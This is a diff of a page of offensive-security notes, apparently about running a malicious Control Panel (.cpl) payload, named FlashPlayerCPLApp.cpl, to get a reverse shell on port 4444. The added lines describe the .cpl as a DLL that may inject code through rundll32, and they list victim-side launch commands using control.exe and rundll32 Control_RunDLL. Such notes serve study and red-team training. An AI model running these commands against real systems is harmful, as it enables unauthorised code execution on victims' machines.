@@ -17,10 +17,22 @@ listening on [any] 4444 ...
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
+We can see that the .cpl is simply a DLL with DllMain function exported:
+
+![](../.gitbook/assets/lnk-dllmain%20%281%29.png)
+
+A quick look at the dissasemble of the dll suggests rundll32 will be spawned and thread code injection may take place:
+
+![](../.gitbook/assets/lnk-dissasm.png)
+
 {% code-tabs %}
 {% code-tabs-item title="victim" %}
-```text
+```bash
 control.exe .\FlashPlayerCPLApp.cpl
+# or
+rundll32.exe shell32.dll,Control_RunDLL file.cpl
+# or
+rundll32.exe shell32.dll,Control_RunDLLAsUser file.cpl
 ```
 {% endcode-tabs-item %}
 {% endcode-tabs %}
